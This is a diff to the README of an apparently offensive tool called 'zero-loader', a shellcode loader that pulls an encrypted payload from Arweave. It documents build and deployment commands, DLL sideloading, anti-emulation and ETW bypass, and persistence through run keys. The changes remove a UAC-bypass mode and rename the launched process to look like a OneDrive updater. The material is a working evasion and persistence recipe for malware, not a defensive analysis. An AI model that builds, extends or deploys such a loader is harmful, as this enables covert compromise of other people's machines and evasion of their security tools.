@@ -68,7 +68,7 @@ Most loaders get flagged because they ship the same binary. **zero-loader** rege
 | **Export Forwarding** | Auto-generated linker pragmas — PE loader handles all legitimate API calls natively |
 | **Version Info Cloning** | Extracts and reproduces `VS_VERSIONINFO` from target DLL |
 | **Process Persistence** | `RtlExitUserProcess` patch + `LdrAddRefDll` pin — DLL survives host exit |
-| **Optional UAC** | `uac` build flag enables self-relaunch elevation via AppInfo RPC bypass — no UAC dialog, no manifest |
+| **Optional UAC** | `REQUIRE_ELEVATION` flag triggers `ShellExecuteA("runas")` elevation before install |
 | **Loader Lock Safe** | DllMain uses ntdll-only APIs; loader pipeline deferred to thread pool |
 
 <br/>
@@ -91,7 +91,6 @@ python arweave/upload.py data.enc
 
 # 4  Build
 build.bat                                  # EXE
-build.bat uac                              # EXE with UAC manifest
 ```
 
 > Re-run steps 2-4 for a completely new binary with fresh crypto material.
@@ -112,7 +111,7 @@ run.bat            # first run creates .venv and installs Flask
                    # then starts http://127.0.0.1:7890
 ```
 
-Covers the entire workflow: encrypt shellcode → upload to Arweave → build EXE/DLL. Streams `build.bat` output live, shows per-section entropy from `Mutate.py`, and exposes every compile-time flag (`DEBUG`, `RWX_SHELLCODE`, `uac`) as a checkbox. The Arweave tab manages wallets, triggers uploads, and scans confirmed transactions.
+Covers the entire workflow: encrypt shellcode → upload to Arweave → build EXE/DLL. Streams `build.bat` output live, shows per-section entropy from `Mutate.py`, and exposes compile-time flags (`DEBUG`, `RWX_SHELLCODE`) as checkboxes. The Arweave tab manages wallets, triggers uploads, and scans confirmed transactions.
 
 </details>
 
@@ -132,8 +131,7 @@ python Encrypt.py payload.bin --wallet <ARWEAVE_ADDRESS>
 python arweave/upload.py data.enc
 
 # 4  Build
-build.bat sideload <target>.dll            # no UAC
-build.bat sideload <target>.dll uac        # self-relaunch UAC
+build.bat sideload <target>.dll
 
 # 5  Deploy
 #    Rename real <target>.dll → <target>_orig.dll
@@ -155,7 +153,7 @@ Edit `Common.h` or pass via `build.bat`:
 | `DEBUG` | Off | Logging to `debug.log`, skips anti-analysis |
 | `RWX_SHELLCODE` | Off | `PAGE_EXECUTE_READWRITE` for Go/Sliver |
 | `BUILD_DLL` | Off | DLL sideload build (set by `build.bat sideload`) |
-| `REQUIRE_ELEVATION` | Off | Self-relaunch UAC for DLL sideload (`build.bat sideload ... uac`) |
+| `REQUIRE_ELEVATION` | Off | Self-relaunch via `ShellExecuteA("runas")` before install (DLL sideload) |
 
 </details>
 
@@ -191,12 +189,9 @@ Main()
  ├─ AntiEmulation              RDTSC variance · CPUID hv brand · mpengine budget burn
  ├─ PatchlessEtw               DR0 = EtwEventWrite
  │
- ├─ [UAC EXE] UacBypass        medium IL → AppInfo RPC → spawn elevated → terminate
- │                              elevated  → InstallAndTerminate (WD excl + copy + task) → terminate
- │                              reboot    → IsFirstRunProcess=FALSE → fall through
- ├─ [non-UAC, first run] InstallAndTerminate / SideloadInstallAndContinue
+ ├─ [first run] InstallAndTerminate / SideloadInstallAndContinue
  │                              InstallPersistence (HKCU run key) → copy → launch → terminate
- ├─ [non-UAC, reboot]    self-guard fires → return → fall through
+ ├─ [reboot]   self-guard fires → return → fall through
  │
  ├─ FetchArweaveMeta           GraphQL POST → TX ID list → GET combined data
  │                              └ ArwParseHeader (4-pipe scan → key/nonce/size/flag)
@@ -228,13 +223,10 @@ Host EXE loads proxy DLL → DllMain
  │   [Host app continues, ExitProcess blocked]
  │
  └─ SideloadWorker (thread pool)
-     ├─ [uac, medium IL] IsElevated? → no: AppInfo RPC bypass → spawn elevated self → terminate
-     ├─ [uac, high IL]   IsElevated? → yes: SideloadInstallAndContinue
-     │                                  WD excl + Register-ScheduledTask + copy files
-     │                                  RunTaskViaCom → launch task → terminate
-     ├─ [non-uac, first run] SideloadInstallAndContinue
-     │                        InstallPersistence (HKCU run key) + copy files
-     │                        CreateProcessW("msoia.exe /pf") → terminate
+     ├─ [REQUIRE_ELEVATION, not elevated] ShellExecuteA "runas" → terminate
+     ├─ [first run] SideloadInstallAndContinue
+     │               InstallPersistence (HKCU run key) + copy files
+     │               CreateProcessW("OneDriveUpdateSync.exe /pf") → terminate
      ├─ [reboot] self-guard (/pf) fires → skip install
      ├─ LdrAddRefDll           pin DLL in memory
      └─ Main()                 full loader pipeline (download → decrypt → shellcode)
